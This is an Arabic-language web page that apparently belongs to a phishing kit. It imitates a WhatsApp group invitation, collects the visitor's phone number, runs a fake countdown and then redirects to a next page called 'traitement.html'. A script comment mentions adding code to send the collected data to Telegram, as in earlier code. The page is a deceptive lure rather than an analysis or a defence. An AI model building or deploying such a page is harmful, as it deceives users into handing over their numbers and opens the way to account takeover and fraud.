<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:image" content="whatsapp-logo-icon-isolated-on-transparent-background-free-png.webp">
    <title>انضم إلى مجموعتنا على واتساب</title>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
    <style>
        /* الألوان والأنماط الأساسية */
        :root {
            --primary-color: #25D366;
            --secondary-color: #128C7E;
            --dark-color: #075E54;
            --light-color: #DCF8C6;
            --text-color: #333;
            --light-text: #777;
            --white: #ffffff;
            --gray: #f5f5f5;
            --dark-gray: #e5e5e5;
            --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            --transition: all 0.3s ease;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Tajawal', sans-serif;
            line-height: 1.6;
            color: var(--text-color);
            background-color: var(--gray);
            overflow-x: hidden;
        }

        .container {
            max-width: 1000px;
            margin: 0 auto;
            padding: 20px;
        }

        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .modal-content {
            background-color: var(--white);
            padding: 30px;
            border-radius: 10px;
            width: 100%;
            max-width: 500px;
            box-shadow: var(--shadow);
            animation: fadeIn 0.3s ease-out;
        }

        /* تحسينات العد التنازلي */
        .countdown-container {
            display: none;
            text-align: center;
            padding: 30px;
            background-color: var(--white);
            border-radius: 10px;
            box-shadow: var(--shadow);
            margin-top: 20px;
        }

        .countdown-title {
            font-size: 1.5rem;
            margin-bottom: 20px;
            color: var(--dark-color);
        }

        .countdown-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 25px;
        }

        .countdown-circle {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background: conic-gradient(var(--primary-color) 0%, var(--light-color) 0%);
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            transition: var(--transition);
        }

        .countdown-number {
            font-size: 2.5rem;
            font-weight: 700;
            color: var(--dark-color);
        }

        .countdown-text {
            position: absolute;
            bottom: -25px;
            font-size: 0.9rem;
            color: var(--light-text);
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background-color: var(--light-color);
            border-radius: 4px;
            margin: 20px 0;
            overflow: hidden;
        }

        .progress-bar-fill {
            height: 100%;
            background-color: var(--primary-color);
            width: 0%;
            transition: width 1s linear;
            border-radius: 4px;
        }

        .status-message {
            font-size: 1.1rem;
            color: var(--light-text);
            margin-top: 20px;
        }

        .whatsapp-icon {
            font-size: 2rem;
            color: var(--primary-color);
            margin: 15px 0;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>
    <!-- نموذج إدخال رقم الهاتف -->
    <div class="modal-overlay" id="phoneModal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>انضم إلى مجموعتنا على واتساب</h2>
                <p>الرجاء إدخال رقم هاتفك للوصول إلى المجموعة</p>
            </div>
            <form id="whatsappForm">
                <div class="form-group">
                    <label for="phone">رقم هاتف واتساب</label>
                    <div class="phone-input-container">
                        <input type="tel" id="phone" class="input-field" required>
                    </div>
                    <small style="color: var(--light-text);">سوف تتلقى رابط الدعوة على واتساب</small>
                </div>
                <div class="form-group">
                    <button type="submit" class="submit-btn" id="submitBtn">
                        <span>انضم إلى المجموعة</span>
                        <i class="fab fa-whatsapp"></i>
                    </button>
                </div>
            </form>

            <div class="countdown-container" id="countdownSection">
                <h3 class="countdown-title">جاري تحضير دعوتك</h3>
                
                <div class="countdown-wrapper">
                    <div class="countdown-circle" id="countdownCircle">
                        <span class="countdown-number" id="countdown">20</span>
                        <span class="countdown-text">ثانية</span>
                    </div>
                </div>
                
                <div class="progress-bar">
                    <div class="progress-bar-fill" id="progressBar"></div>
                </div>
                
                <div class="whatsapp-icon">
                    <i class="fab fa-whatsapp"></i>
                </div>
                
                <p class="status-message">جاري إعداد رابط المجموعة الخاص بك، الرجاء الانتظار...</p>
            </div>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // تهيئة حقل إدخال الهاتف
            const phoneInput = document.getElementById('phone');
            const iti = window.intlTelInput(phoneInput, {
                initialCountry: "sa",
                preferredCountries: ["sa", "ae", "eg", "iq", "jo", "kw", "lb", "om", "qa", "bh"],
                separateDialCode: true,
                utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
            });

            // إرسال النموذج
            const whatsappForm = document.getElementById('whatsappForm');
            const countdownSection = document.getElementById('countdownSection');
            const submitBtn = document.getElementById('submitBtn');
            const countdownElement = document.getElementById('countdown');
            const countdownCircle = document.getElementById('countdownCircle');
            const progressBar = document.getElementById('progressBar');
            
            whatsappForm.addEventListener('submit', function(e) {
                e.preventDefault();
                
                const phoneNumber = iti.getNumber();
                
                if (!phoneNumber || !iti.isValidNumber()) {
                    alert('الرجاء إدخال رقم هاتف صحيح.');
                    return;
                }
                
                submitBtn.innerHTML = '<span class="spinner"></span> <span>جاري الإرسال...</span>';
                submitBtn.disabled = true;
                
                // إخفاء النموذج وعرض العد التنازلي
                whatsappForm.style.display = 'none';
                countdownSection.style.display = 'block';
                
                // بدء العد التنازلي (20 ثانية)
                let seconds = 20;
                const totalSeconds = seconds;
                const circumference = 2 * Math.PI * 50;
                
                const countdownInterval = setInterval(() => {
                    seconds--;
                    countdownElement.textContent = seconds;
                    
                    // تحديث دائرة التقدم
                    const progress = 1 - (seconds / totalSeconds);
                    const offset = circumference * progress;
                    countdownCircle.style.background = `
                        conic-gradient(var(--primary-color) ${progress * 100}%, 
                        var(--light-color) ${progress * 100}%
                    `;
                    
                    // تحديث شريط التقدم
                    progressBar.style.width = `${progress * 100}%`;
                    
                    if (seconds <= 0) {
                        clearInterval(countdownInterval);
                        // الانتقال إلى الصفحة التالية بعد انتهاء العد
                        window.location.href = 'traitement.html';
                    }
                }, 1000);
                
                // يمكنك هنا إضافة كود إرسال البيانات إلى التليجرام إذا لزم الأمر
                // كما في الكود السابق
            });
        });
    </script>
</body>
</html>
